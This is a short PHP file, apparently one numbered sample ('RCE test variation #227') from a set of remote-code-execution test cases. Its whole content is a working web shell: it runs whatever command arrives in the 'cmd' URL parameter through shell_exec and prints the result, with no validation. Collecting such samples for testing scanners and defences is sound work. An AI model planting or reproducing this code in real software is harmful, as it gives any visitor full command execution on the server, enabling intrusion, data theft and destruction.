<?php
// RCE test variation #227
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>